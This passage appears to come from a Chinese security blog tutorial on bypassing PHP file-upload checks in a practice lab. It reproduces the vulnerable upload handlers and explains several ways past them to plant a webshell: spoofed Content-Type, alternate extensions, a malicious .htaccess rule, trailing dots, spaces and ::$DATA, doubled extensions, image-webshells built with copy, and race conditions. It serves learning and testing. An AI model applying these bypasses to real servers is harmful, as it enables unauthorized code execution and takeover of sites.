&lt;p&gt;isset ()，用于检测变量是否设置，并且不是 NULL。如果该变量存在且非空则返回 TRUE，否则返回 FALSE&lt;/p&gt;
&lt;p&gt;file_exists ()，检查文件或目录是否存在。如果指定的文件或目录存在则返回 true，否则返回 false。&lt;/p&gt;
&lt;p&gt;move_uploaded_file (), 将上传的文件移动到新位置若成功，则返回 true，否则返回 false。&lt;/p&gt;
&lt;p&gt;$FILES，FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $*FILES 为二维数组；如果为多个文件上传，那么 $*FILES 为三维数组。_&lt;/p&gt;
&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 客户端文件的原名称。&lt;/p&gt;
&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 “image/gif”。&lt;/p&gt;
&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件被上传后在服务端储存的临时文件名&lt;/p&gt;
&lt;h3 id=&#34;绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h3&gt;
&lt;p&gt;进行抓包，将 Content-Type 修改为允许上传的类型（image/jpeg、image/png、image/gif）三选一。&lt;/p&gt;
&lt;h2 id=&#34;黑名单检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单检测&#34;&gt;#&lt;/a&gt; 黑名单检测&lt;/h2&gt;
&lt;h3 id=&#34;特殊后缀绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊后缀绕过&#34;&gt;#&lt;/a&gt; 特殊后缀绕过&lt;/h3&gt;
&lt;p&gt;所谓黑名单就是限制了哪些不可以上传，除去黑名单上的限制都可以。所以我们只要构造黑名单之外的后缀名即可绕过&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
$msg &amp;#x3D; null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) &amp;#123;
    if (file_exists(UPLOAD_PATH)) &amp;#123;
        $deny_ext &amp;#x3D; array(&amp;#39;.asp&amp;#39;,&amp;#39;.aspx&amp;#39;,&amp;#39;.php&amp;#39;,&amp;#39;.jsp&amp;#39;);&amp;#x2F;&amp;#x2F;定义数组
        $file_name &amp;#x3D; trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);&amp;#x2F;&amp;#x2F;移除字符串两侧的空白字符
        $file_name &amp;#x3D; deldot($file_name);&amp;#x2F;&amp;#x2F;删除文件名末尾的点
        $file_ext &amp;#x3D; strrchr($file_name, &amp;#39;.&amp;#39;);&amp;#x2F;&amp;#x2F;查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符   
        $file_ext &amp;#x3D; strtolower($file_ext); &amp;#x2F;&amp;#x2F;转换为小写
        $file_ext &amp;#x3D; str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);&amp;#x2F;&amp;#x2F;去除字符串::$DATA
        &amp;#x2F;&amp;#x2F;php在windows的时候如果文件名+&amp;quot;::$DATA&amp;quot;会把其之后的数据当成文件流处理，不会检测后缀名。 且保持&amp;quot;:: $DATA&amp;quot;之前的文件名   1.php::$DATA  &amp;#x3D;&amp;#x3D;1.php
        $file_ext &amp;#x3D; trim($file_ext); &amp;#x2F;&amp;#x2F;收尾去空 

        if(!in_array($file_ext, $deny_ext))&amp;#x2F;&amp;#x2F;搜索$deny_ext这个数组里的$file_ext，且有为真
        &amp;#123;
            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
            $img_path &amp;#x3D; UPLOAD_PATH.&amp;#39;&amp;#x2F;&amp;#39;.date(&amp;quot;YmdHis&amp;quot;).rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) &amp;#123;
                 $is_upload &amp;#x3D; true;
            &amp;#125; else &amp;#123;
                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
            &amp;#125;
        &amp;#125; else &amp;#123;
            $msg &amp;#x3D; &amp;#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#39;;
        &amp;#125;
    &amp;#125; else &amp;#123;
        $msg &amp;#x3D; UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
    &amp;#125;
&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;strrchr()&lt;/strong&gt; 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;array()&lt;/strong&gt; 函数用于创建数组。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数组类型：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数值数组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;带有数字 ID 键的数组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关联数组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;带有指定的键的数组，每个键关联一个值&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多维数组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;包含一个或多个数组的数组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;trim()&lt;/strong&gt; 函数移除字符串两侧的空白字符或其他预定义字符。&lt;/p&gt;
&lt;p&gt;相关函数：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ltrim()&lt;/strong&gt;： 移除字符串左侧的空白字符或其他预定义字符。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;rtrim()&lt;/strong&gt; 移除字符串右侧的空白字符或其他预定义字符。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;strtolower(string)&lt;/strong&gt; 函数把字符串转换为小写。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;str_ireplace()&lt;/strong&gt; 函数替换字符串中的一些字符（不区分大小写）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;in_array()&lt;/strong&gt; 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE&lt;/p&gt;
&lt;h4 id=&#34;绕过方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法-2&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h4&gt;
&lt;p&gt;只需要构造黑名单以外的后缀名即可进行绕过，所以我们上传后缀名为 &lt;code&gt;.php1、.php2、phtml&lt;/code&gt;  等等都可以完成绕过，然后成功上传了一句话木马，用菜刀或者蚁剑连接即可&lt;/p&gt;
&lt;h4 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
&lt;p&gt;要在 apache 的 httpd.conf 中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析 php5 代码的&lt;/p&gt;
&lt;p&gt;PHPStudy 中 AddType application/x-httpd-php 等 Apache 命令之所以在 Apache 的设置文件中设置后未实现目标效果是由于 PHP 的版本不符导致的，但注意这里的 PHP 版本并不是指 PHP7.3.0、PHP7.4.0 这种版本号，也不是适用于 32 位的 PHP、适用于 64 位的 PHP 这种不同机型的版本，而&lt;strong&gt;是 PHP 的 NTS (Non Thread Safe) 与 TS (Thread Safe) 的这种不同版本导致的&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;htaccess文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess文件绕过&#34;&gt;#&lt;/a&gt; .htaccess 文件绕过&lt;/h3&gt;
&lt;p&gt;.htaccess 文件，全称是超文本入口，提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。&lt;/p&gt;
&lt;p&gt;.htaccess 文件内容&lt;/p&gt;
&lt;p&gt;AddType application/x-httpd-php .jpg&lt;/p&gt;
&lt;p&gt;这样配置有一个问题，apache 会将所有的文件当作 php 文件解析，这样会明显影响系统的功能，改进代码如下，这样系统就只对文件名包含 “info.png” 字符串的文件进行解析. &amp;lt;FilesMatch &amp;quot;info.png&amp;quot;&amp;gt; setHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt;&lt;/p&gt;
&lt;h4 id=&#34;注意-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意-2&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
&lt;p&gt;.htaccess 文件没有名字，他就是.htaccess 文件，如果你将他改为 4.htaccess 或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;如果以上操作都弄好了，还是出不来，还是去改 phpstudy 配置文件，其他选项菜单 -- 打开配置文件 ---httpd.conf&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2509712-20211105170239261-2058341176.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;箭头指向位置一开始 none, 改为 all 保存，重启 phpstudy，就可以了。&lt;/p&gt;
&lt;h6 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h6&gt;
&lt;p&gt;代码中没有对后缀名进行大小写过滤，而且 windows 对大小写不敏感&lt;/p&gt;
&lt;h6 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h6&gt;
&lt;p&gt;前提：Windows 下 xx.jpg [空格] 或者 xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows 会默认去除空格或点&lt;/p&gt;
&lt;p&gt;它没有 trim () 函数，也就是用来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，它在黑名单之外，我们就可以成功进行上传&lt;/p&gt;
&lt;h6 id=&#34;点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点绕过&#34;&gt;#&lt;/a&gt; 点绕过&lt;/h6&gt;
&lt;p&gt;它没有 deldot () 函数，也就是不会删除我们文件名末尾的点 (.)，所以我们可以上传带有小数点的后缀名来进行绕过&lt;/p&gt;
&lt;h6 id=&#34;流文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流文件绕过&#34;&gt;#&lt;/a&gt; 流文件绕过&lt;/h6&gt;
&lt;p&gt;我们可以在后缀名后面加上::$DATA 来进行绕过。&lt;/p&gt;
&lt;h6 id=&#34;点空格点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点空格点绕过&#34;&gt;#&lt;/a&gt; 点空格点绕过&lt;/h6&gt;
&lt;p&gt;它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php. .&lt;/p&gt;
&lt;h6 id=&#34;后缀名双写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀名双写绕过&#34;&gt;#&lt;/a&gt; 后缀名双写绕过&lt;/h6&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$file_name &amp;#x3D; str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;它将 $deny_ext 这个数组里的数据都替换成了空，参考 sql 注入里的双写便可完成绕过。&lt;/p&gt;
&lt;p&gt;1.phphpp&lt;/p&gt;
&lt;p&gt;1.php&lt;/p&gt;
&lt;h2 id=&#34;图片马绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片马绕过&#34;&gt;#&lt;/a&gt; 图片马绕过&lt;/h2&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;function getReailFileType($filename)&amp;#123;
    $file &amp;#x3D; fopen($filename, &amp;quot;rb&amp;quot;);&amp;#x2F;&amp;#x2F;打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。
    $bin &amp;#x3D; fread($file, 2); &amp;#x2F;&amp;#x2F;只读2字节
    fclose($file);
    $strInfo &amp;#x3D; @unpack(&amp;quot;C2chars&amp;quot;, $bin);    
    $typeCode &amp;#x3D; intval($strInfo[&amp;#39;chars1&amp;#39;].$strInfo[&amp;#39;chars2&amp;#39;]);    
    $fileType &amp;#x3D; &amp;#39;&amp;#39;;    
    switch($typeCode)&amp;#123;      
        case 255216:            
            $fileType &amp;#x3D; &amp;#39;jpg&amp;#39;;
            break;
        case 13780:            
            $fileType &amp;#x3D; &amp;#39;png&amp;#39;;
            break;        
        case 7173:            
            $fileType &amp;#x3D; &amp;#39;gif&amp;#39;;
            break;
        default:            
            $fileType &amp;#x3D; &amp;#39;unknown&amp;#39;;
        &amp;#125;    
        return $fileType;
&amp;#125;

$is_upload &amp;#x3D; false;
$msg &amp;#x3D; null;
if(isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#123;
    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
    $file_type &amp;#x3D; getReailFileType($temp_file);

    if($file_type &amp;#x3D;&amp;#x3D; &amp;#39;unknown&amp;#39;)&amp;#123;
        $msg &amp;#x3D; &amp;quot;文件未知，上传失败！&amp;quot;;
    &amp;#125;else&amp;#123;
        $img_path &amp;#x3D; UPLOAD_PATH.&amp;quot;&amp;#x2F;&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_type;
        if(move_uploaded_file($temp_file,$img_path))&amp;#123;
            $is_upload &amp;#x3D; true;
        &amp;#125; else &amp;#123;
            $msg &amp;#x3D; &amp;quot;上传出错！&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;图片马制作方法： copy a.jpg/b + shell.php/a shell.jpg/b 表示一个二进制文件 + 表示将多个文件合并成一个文件 /a 表示一个 ASCII 文本文件&lt;/p&gt;
&lt;p&gt;fopen () 函数打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。&lt;/p&gt;
&lt;p&gt;fread () 函数读取打开的文件。&lt;/p&gt;
&lt;p&gt;fclose () 函数关闭一个打开文件&lt;/p&gt;
&lt;p&gt;unpack () 函数从二进制字符串对数据进行解包。&lt;/p&gt;
&lt;p&gt;intval () 函数用于获取变量的整数值。&lt;/p&gt;
&lt;h2 id=&#34;条件竞争上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#条件竞争上传&#34;&gt;#&lt;/a&gt; 条件竞争上传&lt;/h2&gt;
&lt;p&gt;条件竞争漏洞是一种服务器端漏洞，由于服务器端在处理用户请求时，是并发进行的，因此 如果并非处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
$msg &amp;#x3D; null;

if(isset($_POST[&amp;#39;submit&amp;#39;]))
&amp;#123;
    $ext_arr &amp;#x3D; array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;);
    $file_name &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];
    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
    $file_ext &amp;#x3D; substr($file_name,strrpos($file_name,&amp;quot;.&amp;quot;)+1);
    $upload_file &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $file_name;

    if(move_uploaded_file($temp_file, $upload_file))
    &amp;#123;
        if(in_array($file_ext,$ext_arr))
        &amp;#123;
             $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39;. rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_ext;
             rename($upload_file, $img_path);&amp;#x2F;&amp;#x2F;将$upload_file名字改为$img_path
             $is_upload &amp;#x3D; true;
        &amp;#125;
     else
        &amp;#123;
            $msg &amp;#x3D; &amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;;
            unlink($upload_file);
        &amp;#125;
    &amp;#125;else&amp;#123;
        $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
    &amp;#125;
&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;strrpos () 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）&lt;/p&gt;
&lt;p&gt;substr () 函数返回字符串的一部分。&lt;/p&gt;
&lt;p&gt;rename () 函数重命名文件或目录。若成功，则该函数返回 true。若失败，则返回 false。&lt;/p&gt;
&lt;p&gt;unlink () 函数删除文件。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。&lt;/p&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
</feed>
